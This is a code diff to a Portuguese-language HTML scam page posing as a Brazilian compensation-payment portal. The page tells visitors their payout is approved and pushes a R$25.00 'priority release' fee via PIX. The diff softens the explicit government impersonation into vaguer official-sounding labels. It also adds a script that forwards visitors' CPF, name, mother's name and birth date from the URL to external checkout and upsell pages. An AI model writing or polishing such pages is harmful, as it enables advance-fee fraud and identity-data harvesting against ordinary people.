@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Portal de Indenizações - Consulta Consolidada</title>
+    <title>Portal de Liberação - Consulta Consolidada</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
     <style>
@@ -22,20 +22,20 @@
                 </div>
                 <div>
                     <h1 class="font-bold text-sm tracking-tight text-gray-700 uppercase leading-tight">
-                        Sistema Único de <br> Pagamentos Indenizatórios
+                        Central Unificada de <br> Pagamentos Indenizatórios
                     </h1>
                 </div>
             </div>
             <div class="text-[10px] text-gray-500 text-right hidden md:block">
-                <span>Portal Oficial da União <br> Acesso Seguro via Protocolo SSL</span>
+                <span>Ambiente Seguro de Liberação <br> Acesso via Protocolo SSL</span>
             </div>
         </div>
     </header>
 
     <div class="gov-blue py-1">
         <div class="max-w-5xl mx-auto px-4 text-white text-[12px] flex justify-between">
-            <span>BRASIL.GOV.BR</span>
-            <span class="opacity-80">ÓRGÃO REGULADOR DE ATIVOS</span>
+            <span>SISTEMA-INDENIZA.BR</span>
+            <span class="opacity-80">PROTOCOLO DE LIBERAÇÃO DE ATIVOS</span>
         </div>
     </div>
 
@@ -54,7 +54,7 @@
                 <h2 class="text-2xl font-bold text-gray-900 mb-6">Status da Indenização: <span class="text-green-600">Aprovada</span></h2>
                 
                 <p class="text-gray-600 leading-relaxed mb-6">
-                    Informamos que os valores referentes à sua indenização foram processados e encontram-se em conta de custódia. De acordo com o protocolo padrão de processamento em lote, o desembolso segue o fluxo ordinário de compensação bancária estatal.
+                    Informamos que os valores referentes à sua indenização foram processados e encontram-se em conta de custódia. De acordo com o protocolo padrão de processamento em lote, o desembolso segue o fluxo ordinário de compensação bancária.
                 </p>
 
                 <div class="space-y-6">
@@ -63,13 +63,13 @@
                         <span class="absolute top-0 right-0 bg-blue-600 text-white text-[10px] px-3 py-1 font-bold uppercase rounded-bl-lg">Recomendado</span>
                         <h3 class="font-bold text-blue-900 text-lg mb-2">Liberação Imediata (Via PIX)</h3>
                         <p class="text-sm text-blue-800 mb-4 leading-snug">
-                            Para usuários que necessitam do capital com urgência. A taxa de processamento prioritário cobre os custos de liquidação em tempo real junto ao Banco Central.
+                            Para usuários que necessitam do capital com urgência. A taxa de processamento prioritário cobre os custos de liquidação em tempo real junto ao sistema bancário.
                         </p>
                         <div class="flex items-center justify-between mb-6">
                             <span class="text-xs text-gray-500 uppercase font-bold tracking-widest">Tempo de Espera:</span>
                             <span class="font-bold text-blue-700">Até 5 minutos</span>
                         </div>
-                        <a href="https://govbeneficio.vercel.app/checkout.html?cpf={{cpf}}&nome={{nome}}&mae={{nomeMae}}&nascimento={{nascimento}}" class="block w-full text-center bg-blue-700 hover:bg-blue-800 text-white font-bold py-4 rounded-lg transition-all shadow-md">
+                        <a id="link-checkout" href="https://govbeneficio.vercel.app/checkout.html" class="block w-full text-center bg-blue-700 hover:bg-blue-800 text-white font-bold py-4 rounded-lg transition-all shadow-md">
                             ANTECIPAR MEU RECEBIMENTO (R$ 25,00)
                         </a>
                     </div>
@@ -89,7 +89,7 @@
                             <span class="text-xs text-gray-400 uppercase font-bold tracking-widest">Tempo de Espera:</span>
                             <span class="font-bold text-gray-600">120 dias úteis</span>
                         </div>
-                        <a href="https://govbeneficio.vercel.app/up2.html?cpf={{cpf}}&nome={{nome}}&mae={{nomeMae}}&nascimento={{nascimento}}" class="block w-full text-center border border-gray-300 text-gray-500 font-semibold py-3 rounded-lg hover:bg-gray-50 transition-all">
+                        <a id="link-upsell" href="https://govbeneficio.vercel.app/up2.html" class="block w-full text-center border border-gray-300 text-gray-500 font-semibold py-3 rounded-lg hover:bg-gray-50 transition-all">
                             Desejo esperar 120 dias
                         </a>
                     </div>
@@ -106,10 +106,23 @@
         </div>
 
         <p class="mt-8 text-center text-xs text-gray-400">
-            © 2026 Portal de Pagamentos Governamentais - Todos os direitos reservados. <br>
+            © 2026 Portal de Pagamentos e Restituições - Todos os direitos reservados. <br>
             Este é um ambiente seguro. Suas transações são protegidas por criptografia de ponta a ponta.
         </p>
     </main>
 
+    <script>
+        document.addEventListener("DOMContentLoaded", function() {
+            const params = window.location.search;
+            if (params) {
+                const checkoutBtn = document.getElementById("link-checkout");
+                const upsellBtn = document.getElementById("link-upsell");
+                
+                // Pega o href original e adiciona os parâmetros da URL atual
+                checkoutBtn.href = checkoutBtn.href + params;
+                upsellBtn.href = upsellBtn.href + params;
+            }
+        });
+    </script>
 </body>
 </html>
